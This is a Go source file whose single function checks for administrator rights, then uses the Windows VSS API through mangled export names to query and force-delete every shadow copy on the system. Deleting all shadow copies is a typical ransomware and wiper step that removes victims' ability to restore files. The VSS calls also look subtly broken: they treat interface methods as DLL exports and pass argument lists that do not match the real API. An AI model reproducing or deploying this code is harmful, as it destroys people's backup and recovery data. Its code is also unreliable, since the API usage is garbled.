package delete_shadow

import (
	"syscall"
	"unsafe"
)

var (
	ole32   = syscall.NewLazyDLL("ole32.dll")
	vssapi  = syscall.NewLazyDLL("vssapi.dll")
	shell32 = syscall.NewLazyDLL("shell32.dll")
)

func isAdmin() bool {
	// Try to open a privileged resource to check admin status
	_, err := syscall.Open("\\\\.\\PHYSICALDRIVE0", syscall.O_RDONLY, 0)
	return err == nil
}

func DeleteShadow() {
	// Check admin privileges
	if !isAdmin() {
		println("Error: This operation requires administrator privileges. Please run as administrator.")
		return
	}

	// Initialize COM
	hr, _, _ := ole32.NewProc("CoInitialize").Call(0)
	if hr != 0 {
		println("Failed to initialize COM")
		return
	}
	defer ole32.NewProc("CoUninitialize").Call()

	// Create VSS backup components using the proper mangled name
	createProc := vssapi.NewProc("?CreateVssBackupComponents@@YAJPEAPEAVIVssBackupComponents@@@Z")
	var backupComponents uintptr
	hr, _, _ = createProc.Call(uintptr(unsafe.Pointer(&backupComponents)))
	if hr != 0 {
		println("Failed to create VSS backup components, error:", hr)
		return
	}

	// Initialize for backup
	initProc := vssapi.NewProc("?InitializeForBackup@IVssBackupComponents@@QEAAJPEBG@Z")
	hr, _, _ = initProc.Call(backupComponents, 0)
	if hr != 0 {
		println("Failed to initialize for backup, error:", hr)
		return
	}

	// Set context
	setCtxProc := vssapi.NewProc("?SetContext@IVssBackupComponents@@QEAAJJ@Z")
	hr, _, _ = setCtxProc.Call(backupComponents, 0xFFFFFFFF) // VSS_CTX_ALL
	if hr != 0 {
		println("Failed to set VSS context, error:", hr)
		return
	}

	// Query for snapshots
	var snapshotsCount uint32
	queryProc := vssapi.NewProc("?Query@IVssBackupComponents@@QEAAJPEAUGUID@@W4_VSS_OBJECT_TYPE@@1@Z")
	hr, _, _ = queryProc.Call(
		backupComponents,
		0, // NULL GUID
		2, // VSS_OBJECT_SNAPSHOT
		uintptr(unsafe.Pointer(&snapshotsCount)))
	if hr != 0 {
		println("Failed to query for snapshots, error:", hr)
		return
	}
	if snapshotsCount == 0 {
		println("No shadow copies found")
		return
	}

	// Delete snapshots
	deleteProc := vssapi.NewProc("?DeleteSnapshots@IVssBackupComponents@@QEAAJUGUID@@W4_VSS_OBJECT_TYPE@@_NPEAJ@Z")
	hr, _, _ = deleteProc.Call(
		backupComponents,
		0, // NULL GUID
		2, // VSS_OBJECT_SNAPSHOT
		1, // TRUE - force delete
		0)
	if hr != 0 {
		println("Failed to delete shadow copies, error:", hr)
		return
	}

	println("Successfully deleted", snapshotsCount, "shadow copies")
}
